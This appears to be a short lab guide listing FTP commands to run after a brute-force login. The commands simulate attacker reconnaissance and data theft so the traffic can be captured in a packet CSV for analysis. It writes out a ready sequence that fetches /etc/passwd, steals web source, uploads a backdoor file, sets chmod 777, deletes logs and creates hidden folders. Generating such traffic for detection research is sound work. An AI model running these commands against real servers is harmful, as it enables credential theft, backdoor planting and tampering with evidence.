# Post-Exploitation FTP Commands

After successfully logging in (exploiting the credentials), run these commands to simulate an attacker exploring and stealing data. These actions generate distinct traffic patterns separate from the login brute-force.

## Reconnaissance (Looking around)
1.  `pwd` - Check current directory.
2.  `dir` or `ls -la` - List all files, including hidden ones.
3.  `syst` - Check the system type (OS).
4.  `stat` - Check server status.
5.  `help` - List available commands.

## Malicious Actions (Stealing/Planting data)
6.  `get /etc/passwd` - Attempt to steal the password file (classic unix attack).
7.  `get /var/www/html/index.php` - Steal web source code.
8.  `put local_exploit.sh malicious_script.sh` - Upload a "malicious" file (you can create a dummy file for this).
9.  `chmod 777 malicious_script.sh` - Attempt to change permissions (via SITE command if supported, often `SITE CHMOD 777 file`).
10. `dele important_log.txt` - Try to delete a file.
11. `mkd .hidden_folder` - Create a hidden directory to hide tools.

## Example Sequence for your Lab
Run this sequence after the brute-force succeeds:

```bash
pwd
syst
dir
get /etc/passwd
mkdir .hacked
cd .hacked
put malicious_backdoor.php
ls -la
quit
```

These commands will appear in your `ftp_packets.csv` under the `ftp.request.arg` and `ftp.request.command` columns.
